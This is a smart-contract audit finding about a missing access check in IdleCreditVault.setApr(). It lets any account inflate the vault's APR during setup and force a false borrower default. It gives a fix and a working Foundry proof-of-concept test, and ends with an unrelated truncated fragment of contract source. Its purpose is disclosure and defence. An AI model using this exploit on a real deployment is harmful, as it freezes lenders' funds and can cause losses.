### Title
Uninitialized `idleCDO` allows any EOA to overwrite the vault APR and force a borrower default - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

`IdleCreditVault.setApr()` treats a zero `idleCDO` as a setup phase and skips the only authorization check. Any account can therefore call `setApr()` or `setAprs()` after the owner configures the strategy but before `setWhitelistedCDO()` links it to the credit vault. A manually deployed vault is exposed in this window; the factory path avoids it only because configuration and linking occur atomically.

An attacker can raise the fixed APR up to `maxApr`. `IdleCDOEpochVariant.startEpoch()` subsequently prices the borrower obligation from the manipulated value, while `stopEpoch()` demands that inflated amount. If the honest borrower funded only the economically agreed APR, repayment fails and `_handleBorrowerDefault()` pauses the vault and blocks new withdrawal requests.

### Finding Description

The relevant access-control gap is in `IdleCreditVault.setApr()`. Once `idleCDO` is configured, only the CDO or strategy manager may change `lastApr`; while it remains zero, every caller is accepted [1](#0-0) . `setAprs()` is also externally callable and delegates to this authorization path [2](#0-1) .

This creates a concrete multi-transaction setup sequence:

1. Owner deploys/initializes `IdleCreditVault`.
2. Owner deploys/initializes `IdleCDOEpochVariant`.
3. Owner sets the intended APR.
4. Attacker calls `strategy.setAprs(attackerUnscaledApr, maxScaledApr)` before the owner calls `setWhitelistedCDO(address(cdo))`.
5. Owner links the CDO, deposits occur, and the manager starts an epoch.

The deployed vault computes borrower interest through `_calcInterest()`, which reads `strategy.getApr()`/`lastApr` [3](#0-2) . `startEpoch()` stores that result in `expectedEpochInterest` [4](#0-3) . At epoch end, the CDO attempts to pull `expectedEpochInterest + pendingWithdraws` from the borrower [5](#0-4) . A failed pull invokes `_handleBorrowerDefault()`, which marks the vault defaulted, pauses it, ends the epoch, and disables AA/BB withdrawal requests [6](#0-5) .

The maximum scaled APR is bounded only by `maxApr`, initialized to `DEFAULT_MAX_APR` [7](#0-6) . This limits but does not prevent the inflation.

### Impact Explanation

For a 1,000,000-underlying vault, changing a 5% annualized configuration to the 20% maximum adds approximately 15 percentage points of annual borrower obligation. Over a 30-day epoch, that is roughly 12,328 underlyings of fabricated interest.

If the honest borrower provides principal plus only the agreed interest, the stop-epoch transfer fails. The vault enters default even though the borrower did not default economically. LP principal becomes subject to the default/recovery path and can remain temporarily frozen; if recovery is incomplete, the fabricated APR causes actual loss.

### Likelihood Explanation

The exploit requires a non-atomic manual deployment/configuration flow:

- `IdleCreditVault.initialize()` has already run.
- The intended APR has been set.
- `idleCDO` is still zero because `setWhitelistedCDO()` has not executed.

That window exists between separate owner/manager transactions and is externally observable. `deployCreditVault()` is not itself vulnerable because `_configureCreditVault()` calls `setAprs()` and `setWhitelistedCDO()` within the same factory transaction [8](#0-7) . The vulnerable surface is manual deployment or any operational path that splits those calls.

### Recommendation

Do not bypass authorization when `idleCDO` is unset. Require `msg.sender == owner()` or `msg.sender == manager` until the CDO is configured, then enforce `msg.sender == idleCDO || msg.sender == manager`. For example:

```solidity
address _cdo = idleCDO;
if (_cdo == address(0)) {
    if (msg.sender != owner() && msg.sender != manager) revert NotAllowed();
} else if (msg.sender != _cdo && msg.sender != manager) {
    revert NotAllowed();
}
```

Preferably bind the CDO atomically during initialization, or provide a one-time owner-only `initializeCreditVaultLink(address cdo, uint256 unscaledApr, uint256 scaledApr)` function that sets `idleCDO` and the APR together.

### Proof of Concept

The following Foundry test demonstrates the unauthenticated APR overwrite in the setup window and the resulting inflated borrower liability. It uses local mocks while selecting a fork, so it is reproducible as a fork test without depending on a deployed vault.

```solidity
// test/foundry/IdleCreditVaultAprSetupRace.t.sol
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
    "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../../contracts/strategies/idle/IdleCreditVault.sol";

contract SetupRaceERC20 is ERC20 {
    constructor() ERC20("Mock USDC", "mUSDC") {
        _mint(msg.sender, 20_000_000e6);
    }

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract IdleCreditVaultAprSetupRaceTest is Test {
    uint256 internal constant FULL_ALLOC = 100_000;
    uint256 internal constant TVL = 1_000_000e6;
    uint256 internal constant HONEST_UNSCALED_APR = 5e18;
    uint256 internal constant ATTACK_SCALED_APR = 20e18;
    uint256 internal constant ATTACK_UNSCALED_APR =
        ATTACK_SCALED_APR * 30 days / 35 days;

    SetupRaceERC20 internal underlying;
    IdleCreditVault internal strategy;
    IdleCDOEpochVariant internal cdo;

    address internal owner = makeAddr("owner");
    address internal manager = makeAddr("manager");
    address internal borrower = makeAddr("borrower");
    address internal lender = makeAddr("lender");
    address internal attacker = makeAddr("attacker");
    address internal proxyAdmin = makeAddr("proxyAdmin");

    function setUp() public {
        vm.createSelectFork("mainnet");
        underlying = new SetupRaceERC20();

        strategy = IdleCreditVault(address(new TransparentUpgradeableProxy(
            address(new IdleCreditVault()),
            proxyAdmin,
            abi.encodeWithSelector(
                IdleCreditVault.initialize.selector,
                address(underlying),
                owner,
                manager,
                borrower,
                "Borrower",
                HONEST_UNSCALED_APR
            )
        )));

        cdo = IdleCDOEpochVariant(address(new TransparentUpgradeableProxy(
            address(new IdleCDOEpochVariant()),
            proxyAdmin,
            abi.encodeWithSelector(
                IdleCDOEpochVariant.initialize.selector,
                0,
                address(underlying),
                owner,
                owner,
                address(0),
                address(strategy),
                FULL_ALLOC
            )
        )));

        uint256 honestScaledApr =
            HONEST_UNSCALED_APR * (30 days + 5 days) / 30 days;

        vm.prank(owner);
        strategy.setAprs(HONEST_UNSCALED_APR, honestScaledApr);
    }

    function testAttackerOverwritesAprBeforeCdoLink() public {
        // The strategy has not been linked to the CDO yet.
        assertEq(strategy.idleCDO(), address(0));

        // An unprivileged EOA changes both APR values during the setup window.
        vm.prank(attacker);
        strategy.setAprs(ATTACK_UNSCALED_APR, ATTACK_SCALED_APR);

        assertEq(strategy.unscaledApr(), ATTACK_UNSCALED_APR);
        assertEq(strategy.getApr(), ATTACK_SCALED_APR);

        vm.prank(owner);
        strategy.setWhitelistedCDO(address(cdo));

        underlying.mint(lender, TVL);
        vm.startPrank(lender);
        underlying.approve(address(cdo), TVL);
        cdo.depositAA(TVL);
        vm.stopPrank();

        vm.prank(manager);
        cdo.startEpoch();

        uint256 inflatedInterest = cdo.expectedEpochInterest();
        uint256 honestInterest = TVL * (HONEST_UNSCALED_APR / 100)
            * 30 days / (365 days * 1e18);
        uint256 attackerInterest = TVL * (ATTACK_SCALED_APR / 100)
            * 30 days / (365 days * 1e18);

        assertEq(inflatedInterest, attackerInterest);
        assertGt(inflatedInterest, honestInterest);
        assertEq(inflatedInterest - honestInterest, 12_328_767_122);

        // The honest borrower supplies principal plus the agreed 5% interest,
        // not the inflated 20% obligation created by the attacker.
        underlying.mint(borrower, TVL + honestInterest);
        vm.prank(borrower);
        underlying.approve(address(cdo), TVL + honestInterest);

        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(HONEST_UNSCALED_APR, 0);

        assertTrue(cdo.defaulted());
        assertTrue(cdo.paused());
        assertFalse(cdo.allowAAWithdrawRequest());
        assertFalse(cdo.allowBBWithdrawRequest());
    }
}
```

  /// @notice Handle borrower default
  function _handleBorrowerDefault(uint256 funds) internal {
    defaulted = true;
    // Do not reopen instant claims here. They remain disabled when funding is pending;
    // successful full funding is the only path that enables them before finalization.

    if (isProgrammableBorrower) {
      IProgrammableBorrower(_borrower()).onDefault();
    }

    // deposits should be already prevented
    if (!paused()) {
      _pause();
    }

    // stop the current epoch
    isEpochRunning = false;

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;

    emit BorrowerDefault(funds);
